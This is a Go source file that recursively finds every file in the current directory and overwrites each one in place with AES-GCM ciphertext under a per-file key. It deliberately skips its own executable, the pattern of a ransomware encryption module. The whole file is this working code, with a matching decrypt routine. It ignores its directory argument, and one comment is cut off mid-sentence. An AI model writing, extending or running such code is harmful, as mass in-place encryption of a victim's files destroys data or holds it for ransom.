package main

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
)

// FileList allows iterability and discovery. Also manages key
type FileList struct {
	files []File
}

// DiscoverFilesInDirectory automates discovery of files in directory and returns FileList
func DiscoverFilesInDirectory(dir string) FileList {
	fl := FileList{}

	// Check to resolve self-encryption, defaults to linux
	fn := os.Args[0][2:]
	if runtime.GOOS == "windows" {
		fn = os.Args[0]
	}

	err := filepath.Walk(".",
		func(p string, info os.FileInfo, err error) error {
			check(err)
			if !info.IsDir() && fn != p {
				fl.addFile(p)
			}
			// It's worth noting that for linux systems,
			return nil
		})
	check(err)
	return fl
}

// Adds file to FileList
func (fl *FileList) addFile(fn string) {
	fl.files = append(fl.files, NewFile(fn))
}

// File allows file.encrypt() and file.decrypt() for GCM
type File struct {
	name string
	key  GCMKey
}

// NewFile initializes a new file
func NewFile(fn string) File {
	newFile := File{}

	newFile.key = NewGMCKey()

	newFile.name = fn

	return newFile
}

// Encrypts file
func (f *File) encrypt() {
	pt, err := ioutil.ReadFile(f.name)
	check(err)

	ct := encryptGCM(f.key, pt)

	w, _ := os.Create(f.name)
	defer w.Close()
	w.Write(ct)
}

// Decrypts file
func (f *File) decrypt() {
	ct, err := ioutil.ReadFile(f.name)
	check(err)

	pt := decryptGCM(f.key, ct)

	w, _ := os.Create(f.name)
	defer w.Close()
	w.Write(pt)
}
